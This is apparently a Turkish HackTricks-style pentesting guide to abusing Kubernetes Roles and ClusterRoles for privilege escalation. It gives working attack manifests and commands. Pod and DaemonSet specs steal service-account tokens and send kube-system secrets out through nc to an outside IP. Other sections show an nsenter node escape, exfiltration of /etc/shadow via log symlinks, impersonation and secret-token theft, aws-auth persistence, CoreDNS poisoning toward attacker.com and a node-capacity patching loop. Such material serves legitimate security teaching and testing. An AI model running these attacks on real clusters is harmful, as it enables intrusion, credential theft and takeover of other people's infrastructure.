# Kubernetes'te Roller/ClusterRoller'ın Suistimali

{{#include ../../../banners/hacktricks-training.md}}

Burada bazı potansiyel olarak tehlikeli Roller ve ClusterRoller yapılandırmalarını bulabilirsiniz.\
Unutmayın ki `kubectl api-resources` ile tüm desteklenen kaynakları alabilirsiniz.

## **Ayrıcalık Yükseltme**

Küme içinde **farklı ayrıcalıklara** sahip **farklı bir prensibe erişim sağlama sanatı** olarak tanımlanır (kubernetes kümesi içinde veya dış bulutlara), Kubernetes'te temelde **ayrıcalıkları yükseltmek için 4 ana teknik** vardır:

- Kubernetes kümesi içinde veya dış bulutlara daha iyi ayrıcalıklara sahip diğer kullanıcı/grupları/SAs **taklit edebilme**
- Kubernetes kümesi içinde veya dış bulutlara daha iyi ayrıcalıklara sahip SAs **bulmak veya eklemek için podlar oluşturma/yamanlama/çalıştırma**
- SAs token'larının gizli olarak saklandığı için **gizli bilgileri okuma**
- Bir konteynerden **düğüme kaçabilme**, burada düğümde çalışan konteynerlerin tüm gizli bilgilerini, düğümün kimlik bilgilerini ve çalıştığı bulut içindeki düğümün izinlerini çalabilirsiniz (varsa)
- Anılması gereken beşinci bir teknik, bir podda **port-forward çalıştırma** yeteneğidir; bu sayede o pod içinde ilginç kaynaklara erişim sağlayabilirsiniz.

### Herhangi Bir Kaynağa veya Fiile Erişim (Wildcard)

**Wildcard (\*) herhangi bir kaynak üzerinde herhangi bir fiil için izin verir**. Yöneticiler tarafından kullanılır. Bir ClusterRole içinde bu, bir saldırganın kümedeki herhangi bir namespace'i kötüye kullanabileceği anlamına gelir.
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
resources: ["*"]
verbs: ["*"]
```
### Belirli bir fiil ile Herhangi bir Kaynağa Erişim

RBAC'de, belirli izinler önemli riskler taşır:

1. **`create`:** Herhangi bir küme kaynağı oluşturma yetkisi verir, ayrıcalık yükselmesi riski taşır.
2. **`list`:** Tüm kaynakları listeleme izni verir, hassas verilerin sızdırılma olasılığını artırır.
3. **`get`:** Hizmet hesaplarından gizli bilgilere erişim izni verir, güvenlik tehdidi oluşturur.
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
resources: ["*"]
verbs: ["create", "list", "get"]
```
### Pod Oluştur - Token Çal

Bir pod oluşturma izinlerine sahip bir saldırgan, pod'a ayrıcalıklı bir Hizmet Hesabı ekleyebilir ve Hizmet Hesabı'nı taklit etmek için token'ı çalabilir. Böylece, ayrıcalıkları etkili bir şekilde artırmış olur.

`bootstrap-signer` hizmet hesabının token'ını çalacak ve bunu saldırgana gönderecek bir pod örneği:
```yaml
apiVersion: v1
kind: Pod
metadata:
name: alpine
namespace: kube-system
spec:
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args:
[
"-c",
'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000',
]
serviceAccountName: bootstrap-signer
automountServiceAccountToken: true
hostNetwork: true
```
### Pod Oluşturma & Kaçış

Aşağıdakiler, bir konteynerin sahip olabileceği tüm ayrıcalıkları gösterir:

- **Ayrıcalıklı erişim** (korumaları devre dışı bırakma ve yetenekleri ayarlama)
- **hostIPC ve hostPid ad alanlarını devre dışı bırakma** bu, ayrıcalıkları artırmaya yardımcı olabilir
- **hostNetwork** ad alanını devre dışı bırakma, düğümlerin bulut ayrıcalıklarını çalma ve ağlara daha iyi erişim sağlama
- **Konteyner içinde / ana bilgisayarları bağlama**
```yaml:super_privs.yaml
apiVersion: v1
kind: Pod
metadata:
name: ubuntu
labels:
app: ubuntu
spec:
# Uncomment and specify a specific node you want to debug
# nodeName: <insert-node-name-here>
containers:
- image: ubuntu
command:
- "sleep"
- "3600" # adjust this as needed -- use only as long as you need
imagePullPolicy: IfNotPresent
name: ubuntu
securityContext:
allowPrivilegeEscalation: true
privileged: true
#capabilities:
#  add: ["NET_ADMIN", "SYS_ADMIN"] # add the capabilities you need https://man7.org/linux/man-pages/man7/capabilities.7.html
runAsUser: 0 # run as root (or any other user)
volumeMounts:
- mountPath: /host
name: host-volume
restartPolicy: Never # we want to be intentional about running this pod
hostIPC: true # Use the host's ipc namespace https://www.man7.org/linux/man-pages/man7/ipc_namespaces.7.html
hostNetwork: true # Use the host's network namespace https://www.man7.org/linux/man-pages/man7/network_namespaces.7.html
hostPID: true # Use the host's pid namespace https://man7.org/linux/man-pages/man7/pid_namespaces.7.htmlpe_
volumes:
- name: host-volume
hostPath:
path: /
```
Pod'u oluşturun:
```bash
kubectl --token $token create -f mount_root.yaml
```
Tek satırlık [bu tweet](https://twitter.com/mauilion/status/1129468485480751104) ve bazı eklemelerle:
```bash
kubectl run r00t --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent","securityContext":{"privileged":true}}]}}'
```
#### Gizlilik

Muhtemelen daha **gizli** olmak istiyorsunuz, aşağıdaki sayfalarda, önceki şablonda belirtilen bazı ayrıcalıkları etkinleştirerek bir pod oluşturursanız neleri erişebileceğinizi görebilirsiniz:

- **Ayrıcalıklı + hostPID**
- **Sadece ayrıcalıklı**
- **hostPath**
- **hostPID**
- **hostNetwork**
- **hostIPC**

_Önceki ayrıcalıklı pod yapılandırmalarını nasıl oluşturacağınız/istismar edeceğinizle ilgili örnekleri_ [_https://github.com/BishopFox/badPods_](https://github.com/BishopFox/badPods) adresinde bulabilirsiniz.

### Pod Oluştur - Buluta Geç

Eğer bir **pod** (ve isteğe bağlı olarak bir **hizmet hesabı**) **oluşturabiliyorsanız**, bir pod veya hizmet hesabına **bulut rolleri atayarak bulut ortamında ayrıcalık elde etme** şansınız olabilir ve ardından buna erişebilirsiniz.\
Ayrıca, eğer **host network namespace** ile bir **pod** oluşturabiliyorsanız, **node** örneğinin IAM rolünü **çalıştırabilirsiniz**.

Daha fazla bilgi için kontrol edin:

{{#ref}}
pod-escape-privileges.md
{{#endref}}

### **Deployment, Daemonset, Statefulset, Replicationcontroller, Replicaset, Job ve Cronjob Oluştur/Düzelt**

Bu izinleri istismar ederek **yeni bir pod oluşturmak** ve önceki örnekte olduğu gibi ayrıcalıklar elde etmek mümkündür.

Aşağıdaki yaml **bir daemonset oluşturur ve pod içindeki SA'nın tokenini dışarı aktarır:**
```yaml
apiVersion: apps/v1
kind: DaemonSet
metadata:
name: alpine
namespace: kube-system
spec:
selector:
matchLabels:
name: alpine
template:
metadata:
labels:
name: alpine
spec:
serviceAccountName: bootstrap-signer
automountServiceAccountToken: true
hostNetwork: true
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args:
[
"-c",
'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000',
]
volumeMounts:
- mountPath: /root
name: mount-node-root
volumes:
- name: mount-node-root
hostPath:
path: /
```
### **Pods Exec**

**`pods/exec`** kubernetes'te **bir pod içinde bir shell'de komut çalıştırmak için kullanılan bir kaynaktır**. Bu, **konteynerler içinde komut çalıştırmaya veya bir shell'e girmeye** olanak tanır.

Bu nedenle, **bir pod'a girip SA'nın token'ını çalmak** veya ayrıcalıklı bir pod'a girmek, düğüme kaçmak ve düğümdeki tüm pod'ların token'larını çalmak ve (kötüye) kullanmak mümkündür:
```bash
kubectl exec -it <POD_NAME> -n <NAMESPACE> -- sh
```
> [!NOTE]
> Varsayılan olarak, komut pod'un ilk konteynerinde çalıştırılır. `kubectl get pods <pod_name> -o jsonpath='{.spec.containers[*].name}'` ile **bir konteynerdeki tüm pod'ları** alın ve ardından `kubectl exec -it <pod_name> -c <container_name> -- sh` ile çalıştırmak istediğiniz **konteyneri** belirtin.

Eğer bir distroless konteyner ise, konteynerlerin bilgilerini almak veya kendi araçlarınızı yüklemek için **shell builtins** kullanmayı deneyebilirsiniz, örneğin: **`kubectl cp </path/local/file> <podname>:</path/in/container>`** ile **busybox** yükleyerek.

### port-forward

Bu izin, **bir yerel portu belirtilen pod'daki bir porta yönlendirmeye** olanak tanır. Bu, bir pod içinde çalışan uygulamaları kolayca hata ayıklamak için tasarlanmıştır, ancak bir saldırgan bunu, bir pod içindeki ilginç (DB'ler gibi) veya savunmasız uygulamalara (webler?) erişim elde etmek için kötüye kullanabilir:
```bash
kubectl port-forward pod/mypod 5000:5000
```
### Hosts Writable /var/log/ Kaçışı

As [**bu araştırmada belirtilmiştir**](https://jackleadford.github.io/containers/2020/03/06/pvpost.html), eğer **hosts `/var/log/` dizini montelenmiş** bir pod'a erişebilir veya oluşturabilirseniz, **konteynerden kaçabilirsiniz**.\
Bu, temelde **Kube-API bir konteynerin loglarını almaya çalıştığında** ( `kubectl logs <pod>` kullanarak) pod'un **`0.log`** dosyasını **Kubelet** servisinin `/logs/` uç noktası aracılığıyla talep etmesindendir.\
Kubelet servisi, temelde **konteynerin `/var/log` dosya sistemini açan** `/logs/` uç noktasını sunar.

Bu nedenle, konteynerin **/var/log/ klasöründe yazma erişimi olan** bir saldırgan bu davranışları 2 şekilde kötüye kullanabilir:

- Konteynerinin `0.log` dosyasını (genellikle `/var/logs/pods/namespace_pod_uid/container/0.log` konumunda bulunur) örneğin **`/etc/shadow`'a işaret eden bir symlink** olacak şekilde değiştirmek. Ardından, hosts shadow dosyasını dışarıya sızdırabilirsiniz:
```bash
kubectl logs escaper
failed to get parse function: unsupported log format: "root::::::::\n"
kubectl logs escaper --tail=2
failed to get parse function: unsupported log format: "systemd-resolve:*:::::::\n"
# Keep incrementing tail to exfiltrate the whole file
```
- Eğer saldırgan, **`nodes/log`'u okuma izinlerine sahip** herhangi bir yetkiliyi kontrol ediyorsa, `/host-mounted/var/log/sym` içinde `/`'ye bir **symlink** oluşturabilir ve **`https://<gateway>:10250/logs/sym/` adresine eriştiğinde, ana bilgisayarın kök** dosya sistemini listeleyebilir (symlink'i değiştirmek dosyalara erişim sağlayabilir).
```bash
curl -k -H 'Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6Im[...]' 'https://172.17.0.1:10250/logs/sym/'
<a href="bin">bin</a>
<a href="data/">data/</a>
<a href="dev/">dev/</a>
<a href="etc/">etc/</a>
<a href="home/">home/</a>
<a href="init">init</a>
<a href="lib">lib</a>
[...]
```
**Bir laboratuvar ve otomatik istismar** [**https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts**](https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts) adresinde bulunabilir.

#### readOnly korumasını aşma <a href="#bypassing-hostpath-readonly-protection" id="bypassing-hostpath-readonly-protection"></a>

Eğer şanslıysanız ve yüksek ayrıcalıklı `CAP_SYS_ADMIN` yeteneği mevcutsa, klasörü rw olarak yeniden monte edebilirsiniz:
```bash
mount -o rw,remount /hostlogs/
```
#### hostPath readOnly korumasını aşma <a href="#bypassing-hostpath-readonly-protection" id="bypassing-hostpath-readonly-protection"></a>

[**bu araştırmada**](https://jackleadford.github.io/containers/2020/03/06/pvpost.html) belirtildiği gibi, korumayı aşmak mümkündür:
```yaml
allowedHostPaths:
- pathPrefix: "/foo"
readOnly: true
```
Kaçışları önlemek için, önceki örneklerde olduğu gibi bir hostPath montajı yerine, yazılabilir erişim ile bir ana bilgisayarın klasörünü konteynere monte etmek için bir PersistentVolume ve PersistentVolumeClaim kullanmak amaçlanmıştır:
```yaml
apiVersion: v1
kind: PersistentVolume
metadata:
name: task-pv-volume-vol
labels:
type: local
spec:
storageClassName: manual
capacity:
storage: 10Gi
accessModes:
- ReadWriteOnce
hostPath:
path: "/var/log"
---
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
name: task-pv-claim-vol
spec:
storageClassName: manual
accessModes:
- ReadWriteOnce
resources:
requests:
storage: 3Gi
---
apiVersion: v1
kind: Pod
metadata:
name: task-pv-pod
spec:
volumes:
- name: task-pv-storage-vol
persistentVolumeClaim:
claimName: task-pv-claim-vol
containers:
- name: task-pv-container
image: ubuntu:latest
command: ["sh", "-c", "sleep 1h"]
volumeMounts:
- mountPath: "/hostlogs"
name: task-pv-storage-vol
```
### **Ayrıcalıklı hesapları taklit etme**

Bir [**kullanıcı taklit etme**](https://kubernetes.io/docs/reference/access-authn-authz/authentication/#user-impersonation) ayrıcalığı ile, bir saldırgan ayrıcalıklı bir hesabı taklit edebilir.

Bir kullanıcıyı taklit etmek için `kubectl` komutunda `--as=<username>` parametresini veya bir grubu taklit etmek için `--as-group=<group>` parametresini kullanın:
```bash
kubectl get pods --as=system:serviceaccount:kube-system:default
kubectl get secrets --as=null --as-group=system:masters
```
Ya da REST API'sini kullanın:
```bash
curl -k -v -XGET -H "Authorization: Bearer <JWT TOKEN (of the impersonator)>" \
-H "Impersonate-Group: system:masters"\
-H "Impersonate-User: null" \
-H "Accept: application/json" \
https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```
### Gizli Anahtarları Listeleme

**Gizli anahtarları listeleme izni, bir saldırganın gizli anahtarları gerçekten okumasına izin verebilir** REST API uç noktasına erişerek:
```bash
curl -v -H "Authorization: Bearer <jwt_token>" https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```
### Gizli Anahtarlar Oluşturma ve Okuma

**kubernetes.io/service-account-token** türünde özel bir Kubernetes gizli anahtarı, serviceaccount token'larını saklar. Eğer gizli anahtarlar oluşturma ve okuma izinleriniz varsa ve ayrıca serviceaccount'un adını biliyorsanız, aşağıdaki gibi bir gizli anahtar oluşturabilir ve ardından kurban serviceaccount'un token'ını ondan çalabilirsiniz:
```yaml
apiVersion: v1
kind: Secret
metadata:
name: stolen-admin-sa-token
namespace: default
annotations:
kubernetes.io/service-account.name: cluster-admin-sa
type: kubernetes.io/service-account-token
```
Örnek istismar:
```bash
$ SECRETS_MANAGER_TOKEN=$(kubectl create token secrets-manager-sa)

$ kubectl auth can-i --list --token=$SECRETS_MANAGER_TOKEN
Warning: the list may be incomplete: webhook authorizer does not support user rule resolution
Resources                                       Non-Resource URLs                      Resource Names   Verbs
selfsubjectreviews.authentication.k8s.io        []                                     []               [create]
selfsubjectaccessreviews.authorization.k8s.io   []                                     []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                     []               [create]
secrets                                         []                                     []               [get create]
[/.well-known/openid-configuration/]   []               [get]
<SNIP>
[/version]                             []               [get]

$ kubectl create token cluster-admin-sa --token=$SECRETS_MANAGER_TOKEN
error: failed to create token: serviceaccounts "cluster-admin-sa" is forbidden: User "system:serviceaccount:default:secrets-manager-sa" cannot create resource "serviceaccounts/token" in API group "" in the namespace "default"

$ kubectl get pods --token=$SECRETS_MANAGER_TOKEN --as=system:serviceaccount:default:secrets-manager-sa
Error from server (Forbidden): serviceaccounts "secrets-manager-sa" is forbidden: User "system:serviceaccount:default:secrets-manager-sa" cannot impersonate resource "serviceaccounts" in API group "" in the namespace "default"

$ kubectl apply -f ./secret-that-steals-another-sa-token.yaml --token=$SECRETS_MANAGER_TOKEN
secret/stolen-admin-sa-token created

$ kubectl get secret stolen-admin-sa-token --token=$SECRETS_MANAGER_TOKEN -o json
{
"apiVersion": "v1",
"data": {
"ca.crt": "LS0tLS1CRUdJTiBDRVJUSUZJQ0FU<SNIP>UlRJRklDQVRFLS0tLS0K",
"namespace": "ZGVmYXVsdA==",
"token": "ZXlKaGJHY2lPaUpTVXpJMU5pSXNJbXRwWk<SNIP>jYkowNWlCYjViMEJUSE1NcUNIY0h4QTg2aXc="
},
"kind": "Secret",
"metadata": {
"annotations": {
"kubectl.kubernetes.io/last-applied-configuration": "{\"apiVersion\":\"v1\",\"kind\":\"Secret\",\"metadata\":{\"annotations\":{\"kubernetes.io/service-account.name\":\"cluster-admin-sa\"},\"name\":\"stolen-admin-sa-token\",\"namespace\":\"default\"},\"type\":\"kubernetes.io/service-account-token\"}\n",
"kubernetes.io/service-account.name": "cluster-admin-sa",
"kubernetes.io/service-account.uid": "faf97f14-1102-4cb9-9ee0-857a6695973f"
},
"creationTimestamp": "2025-01-11T13:02:27Z",
"name": "stolen-admin-sa-token",
"namespace": "default",
"resourceVersion": "1019116",
"uid": "680d119f-89d0-4fc6-8eef-1396600d7556"
},
"type": "kubernetes.io/service-account-token"
}
```
Not edin ki, belirli bir ad alanında gizli anahtarlar oluşturma ve okuma izniniz varsa, kurban hizmet hesabı da aynı ad alanında olmalıdır.

### Gizli bir anahtarı okuma – token kimliklerini brute-force ile kırma

Okuma izinlerine sahip bir token'a sahip bir saldırganın, onu kullanmak için gizli anahtarın tam adını bilmesi gerekir; ancak daha geniş _**gizli anahtarları listeleme**_ ayrıcalığına kıyasla, hala zayıflıklar vardır. Sistem içindeki varsayılan hizmet hesapları sıralanabilir ve her biri bir gizli anahtarla ilişkilidir. Bu gizli anahtarların bir ad yapısı vardır: belirli bir ön ekin ardından rastgele beş karakterli alfanümerik bir token (belirli karakterler hariç) gelir; bu, [kaynak koduna](https://github.com/kubernetes/kubernetes/blob/8418cccaf6a7307479f1dfeafb0d2823c1c37802/staging/src/k8s.io/apimachinery/pkg/util/rand/rand.go#L83) göre belirlenmiştir.

Token, tam alfanümerik aralık yerine sınırlı bir 27 karakter setinden (`bcdfghjklmnpqrstvwxz2456789`) üretilir. Bu sınırlama, toplam olası kombinasyonları 14,348,907 (27^5) ile sınırlar. Sonuç olarak, bir saldırgan, hassas hizmet hesaplarına erişim sağlayarak ayrıcalık yükseltmeye yol açabilecek bir brute-force saldırısını birkaç saat içinde gerçekleştirebilir.

### EncrpytionConfiguration düz metin olarak

Bu tür bir nesnede verileri dinlenirken şifrelemek için düz metin anahtarları bulmak mümkündür:
```yaml
# From https://kubernetes.io/docs/tasks/administer-cluster/encrypt-data/

#
# CAUTION: this is an example configuration.
#          Do not use this for your own cluster!
#

apiVersion: apiserver.config.k8s.io/v1
kind: EncryptionConfiguration
resources:
- resources:
- secrets
- configmaps
- pandas.awesome.bears.example # a custom resource API
providers:
# This configuration does not provide data confidentiality. The first
# configured provider is specifying the "identity" mechanism, which
# stores resources as plain text.
#
- identity: {} # plain text, in other words NO encryption
- aesgcm:
keys:
- name: key1
secret: c2VjcmV0IGlzIHNlY3VyZQ==
- name: key2
secret: dGhpcyBpcyBwYXNzd29yZA==
- aescbc:
keys:
- name: key1
secret: c2VjcmV0IGlzIHNlY3VyZQ==
- name: key2
secret: dGhpcyBpcyBwYXNzd29yZA==
- secretbox:
keys:
- name: key1
secret: YWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXoxMjM0NTY=
- resources:
- events
providers:
- identity: {} # do not encrypt Events even though *.* is specified below
- resources:
- '*.apps' # wildcard match requires Kubernetes 1.27 or later
providers:
- aescbc:
keys:
- name: key2
secret: c2VjcmV0IGlzIHNlY3VyZSwgb3IgaXMgaXQ/Cg==
- resources:
- '*.*' # wildcard match requires Kubernetes 1.27 or later
providers:
- aescbc:
keys:
- name: key3
secret: c2VjcmV0IGlzIHNlY3VyZSwgSSB0aGluaw==
```
### Sertifika İmzalama Talepleri

Eğer `certificatesigningrequests` kaynağında (veya en azından `certificatesigningrequests/nodeClient` içinde) **`create`** fiiliniz varsa, yeni bir **node** için yeni bir CeSR **oluşturabilirsiniz.**

[Belgelerde bu taleplerin otomatik onaylanmasının mümkün olduğu belirtiliyor](https://kubernetes.io/docs/reference/command-line-tools-reference/kubelet-tls-bootstrapping/), bu durumda **ek izinlere ihtiyacınız yoktur.** Aksi takdirde, talebi onaylayabilmeniz gerekir, bu da `certificatesigningrequests/approval` üzerinde güncelleme ve `signers` içinde `approve` ile `resourceName` `<signerNameDomain>/<signerNamePath>` veya `<signerNameDomain>/*` anlamına gelir.

Gerekli tüm izinlere sahip bir **rol örneği**:
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: csr-approver
rules:
- apiGroups:
- certificates.k8s.io
resources:
- certificatesigningrequests
verbs:
- get
- list
- watch
- create
- apiGroups:
- certificates.k8s.io
resources:
- certificatesigningrequests/approval
verbs:
- update
- apiGroups:
- certificates.k8s.io
resources:
- signers
resourceNames:
- example.com/my-signer-name # example.com/* can be used to authorize for all signers in the 'example.com' domain
verbs:
- approve
```
Yeni node CSR onaylandığında, node'ların özel izinlerini **istismar** ederek **gizli bilgileri çalabilir** ve **yetki yükseltebilirsiniz**.

[**Bu yazıda**](https://www.4armed.com/blog/hacking-kubelet-on-gke/) ve [**şu yazıda**](https://rhinosecuritylabs.com/cloud-security/kubelet-tls-bootstrap-privilege-escalation/) GKE K8s TLS Bootstrap yapılandırması **otomatik imzalama** ile yapılandırılmıştır ve bu, yeni bir K8s Node'un kimlik bilgilerini oluşturmak için istismar edilmekte ve ardından bu kimlik bilgileri kullanılarak gizli bilgileri çalarak yetki yükseltilmektedir.\
Eğer **bahsedilen yetkilere sahipseniz, aynı şeyi yapabilirsiniz**. İlk örneğin, yeni bir node'un konteynerler içindeki gizli bilgilere erişimini engelleyen hatayı aştığını unutmayın çünkü **bir node yalnızca üzerine monte edilmiş konteynerlerin gizli bilgilerine erişebilir.**

Bunu aşmanın yolu, **ilginç gizli bilgilerin monte edildiği konteynerin bulunduğu node adı için bir node kimlik bilgisi oluşturmak**tır (ama bunu nasıl yapacağınızı ilk yazıda kontrol edin):
```bash
"/O=system:nodes/CN=system:node:gke-cluster19-default-pool-6c73b1-8cj1"
```
### AWS EKS aws-auth configmaps

EKS (AWS'de olmanız gerekir) kümelerinde kube-system ad alanındaki **`configmaps`**'leri değiştirebilen ilkeler, **aws-auth** configmap'ini geçersiz kılarak küme yönetici ayrıcalıkları elde edebilir.\
Gerekli fiiller **`update`** ve **`patch`**'tir, veya configmap oluşturulmadıysa **`create`**'dir:
```bash
# Check if config map exists
get configmap aws-auth -n kube-system -o yaml

## Yaml example
apiVersion: v1
kind: ConfigMap
metadata:
name: aws-auth
namespace: kube-system
data:
mapRoles: |
- rolearn: arn:aws:iam::123456789098:role/SomeRoleTestName
username: system:node{{EC2PrivateDNSName}}
groups:
- system:masters

# Create donfig map is doesn't exist
## Using kubectl and the previous yaml
kubectl apply -f /tmp/aws-auth.yaml
## Using eksctl
eksctl create iamidentitymapping --cluster Testing --region us-east-1 --arn arn:aws:iam::123456789098:role/SomeRoleTestName --group "system:masters" --no-duplicate-arns

# Modify it
kubectl edit -n kube-system configmap/aws-auth
## You can modify it to even give access to users from other accounts
data:
mapRoles: |
- rolearn: arn:aws:iam::123456789098:role/SomeRoleTestName
username: system:node{{EC2PrivateDNSName}}
groups:
- system:masters
mapUsers: |
- userarn: arn:aws:iam::098765432123:user/SomeUserTestName
username: admin
groups:
- system:masters
```
> [!WARNING]
> **`aws-auth`**'ı **kalıcılık** için **diğer hesaplardan** kullanıcı erişimi vermek amacıyla kullanabilirsiniz.
>
> Ancak, `aws --profile other_account eks update-kubeconfig --name <cluster-name>` **farklı bir hesaptan çalışmaz**. Ama aslında `aws --profile other_account eks get-token --cluster-name arn:aws:eks:us-east-1:123456789098:cluster/Testing` çalışır, eğer sadece ismin yerine kümenin ARN'sini koyarsanız.\
> `kubectl`'in çalışması için, sadece **kurbanın kubeconfig**'ini **yapılandırdığınızdan** emin olun ve aws exec argümanlarına `--profile other_account_role` ekleyin, böylece kubectl token almak ve AWS ile iletişim kurmak için diğer hesabın profilini kullanacaktır.

### CoreDNS config map

Eğer `kube-system` ad alanındaki **`coredns` configmap**'ini değiştirme izinleriniz varsa, adreslerin hangi alanlara çözümleneceğini değiştirerek **hassas bilgileri çalmak veya kötü niyetli içerik enjekte etmek** için MitM saldırıları gerçekleştirebilirsiniz.

Gerekli fiiller **`update`** ve **`patch`**'dir, **`coredns`** configmap'i (veya tüm config map'ler) üzerinde.

Normal bir **coredns dosyası** şunları içerir:
```yaml
data:
Corefile: |
.:53 {
log
errors
health {
lameduck 5s
}
ready
kubernetes cluster.local in-addr.arpa ip6.arpa {
pods insecure
fallthrough in-addr.arpa ip6.arpa
ttl 30
}
prometheus :9153
hosts {
192.168.49.1 host.minikube.internal
fallthrough
}
forward . /etc/resolv.conf {
max_concurrent 1000
}
cache 30
loop
reload
loadbalance
}
```
Bir saldırgan, `kubectl get configmap coredns -n kube-system -o yaml` komutunu çalıştırarak bunu indirebilir, `rewrite name victim.com attacker.com` gibi bir şey ekleyerek değiştirebilir, böylece `victim.com` erişildiğinde aslında erişilecek alan adı `attacker.com` olacaktır. Ardından, `kubectl apply -f poison_dns.yaml` komutunu çalıştırarak bunu uygulayabilir.

Diğer bir seçenek, `kubectl edit configmap coredns -n kube-system` komutunu çalıştırarak dosyayı düzenlemek ve değişiklikler yapmaktır.

### GKE'de Yükselme

**GCP ilkelerine K8s izinleri atamanın 2 yolu vardır**. Her durumda, ilkenin ayrıca kümeye erişim sağlamak için **`container.clusters.get`** iznine de ihtiyacı vardır, aksi takdirde **kendi kubectl yapılandırma dosyanızı oluşturmanız** gerekecektir (bir sonraki bağlantıyı takip edin).

> [!WARNING]
> K8s api uç noktasıyla konuşurken, **GCP kimlik doğrulama belirteci gönderilecektir**. Ardından, GCP, K8s api uç noktası aracılığıyla, önce **ilkenin** (e-posta ile) **kümeye herhangi bir erişimi olup olmadığını kontrol edecektir**, ardından **GCP IAM aracılığıyla herhangi bir erişimi olup olmadığını** kontrol edecektir.\
> Eğer bu **herhangi biri** **doğruysa**, **yanıt verilecektir**. Eğer **değilse**, **GCP IAM aracılığıyla izinler verilmesi gerektiğini** öneren bir **hata** verilecektir.

İlk yöntem **GCP IAM** kullanmaktır, K8s izinlerinin **eşdeğer GCP IAM izinleri** vardır ve ilke buna sahipse, bunu kullanabilecektir.

{{#ref}}
../../gcp-security/gcp-privilege-escalation/gcp-container-privesc.md
{{#endref}}

İkinci yöntem, **kümeye içindeki K8s izinlerini atamak** ve kullanıcıyı **e-posta** ile tanımlamaktır (GCP hizmet hesapları dahil).

### Serviceaccounts token oluşturma

**TokenRequests** (`serviceaccounts/token`) oluşturabilen ilkeler K8s api uç noktasıyla konuşurken SAs (bilgi [**buradan**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/token_request.rego)).

### ephemeralcontainers

**`update`** veya **`patch`** **`pods/ephemeralcontainers`** üzerinde yetkisi olan ilkeler, **diğer podlarda kod çalıştırma** yeteneğine sahip olabilir ve ayrıcalıklı bir securityContext ile geçici bir konteyner ekleyerek **düğümden çıkma** potansiyeline sahip olabilir.

### ValidatingWebhookConfigurations veya MutatingWebhookConfigurations

`validatingwebhookconfigurations` veya `mutatingwebhookconfigurations` üzerinde `create`, `update` veya `patch` fiillerinden herhangi birine sahip olan ilkeler, **bu tür bir webhookconfigurations oluşturma** yeteneğine sahip olabilirler, böylece **yetkileri artırma** imkanı bulabilirler.

[`mutatingwebhookconfigurations` örneği için bu gönderinin bu bölümüne bakın](#malicious-admission-controller).

### Yükselme

Bir sonraki bölümde okuyabileceğiniz gibi: [**Yerleşik Ayrıcalık Yükseltme Önleme**](#built-in-privileged-escalation-prevention), bir ilke, kendisi bu yeni izinlere sahip olmadan ne rol ne de clusterrole güncelleyemez veya oluşturamaz. Ancak **`roles`** veya **`clusterroles`** üzerinde **`escalate` veya `*`** fiiline sahipse ve ilgili bağlama seçeneklerine sahipse, yeni roller, clusterrole'ler güncelleyebilir veya oluşturabilir.

### Düğüm proxy

**`nodes/proxy`** alt kaynağına erişimi olan ilkeler, Kubelet API aracılığıyla **podlarda kod çalıştırabilir** (bkz. [**bu**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/nodes_proxy.rego)). Kubelet kimlik doğrulaması hakkında daha fazla bilgi bu sayfada:

{{#ref}}
../pentesting-kubernetes-services/kubelet-authentication-and-authorization.md
{{#endref}}

[**Kubelet API ile yetkilendirilmiş bir şekilde RCE elde etme örneğini burada bulabilirsiniz**](../pentesting-kubernetes-services/index.html#kubelet-rce).

### Podları silme + planlanamaz düğümler

**Podları silebilen** (`delete` fiili ile `pods` kaynağı üzerinde), veya **podları tahliye edebilen** (`create` fiili ile `pods/eviction` kaynağı üzerinde), veya **pod durumunu değiştirebilen** (`pods/status` erişimi) ve **diğer düğümleri planlanamaz hale getirebilen** (`nodes/status` erişimi) veya **düğümleri silebilen** (`delete` fiili ile `nodes` kaynağı üzerinde) ve bir pod üzerinde kontrol sahibi olan ilkeler, **diğer düğümlerden podları çalabilir**, böylece bunlar **kompromize** **düğümde** **çalıştırılır** ve saldırgan bu podlardan **tokenları çalabilir**.
```bash
patch_node_capacity(){
curl -s -X PATCH 127.0.0.1:8001/api/v1/nodes/$1/status -H "Content-Type: json-patch+json" -d '[{"op": "replace", "path":"/status/allocatable/pods", "value": "0"}]'
}

while true; do patch_node_capacity <id_other_node>; done &
#Launch previous line with all the nodes you need to attack

kubectl delete pods -n kube-system <privileged_pod_name>
```
### Services status (CVE-2020-8554)

**`services/status`**'ı **değiştirebilen** ilkeler, `status.loadBalancer.ingress.ip` alanını **düzeltilememiş CVE-2020-8554**'ü istismar etmek için ayarlayabilir ve **küme** üzerinde **MiTM saldırıları** başlatabilir. CVE-2020-8554 için çoğu önlem, yalnızca ExternalIP hizmetlerini engellemektedir (buna göre [**bu**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/modify_service_status_cve_2020_8554.rego)).

### Nodes and Pods status

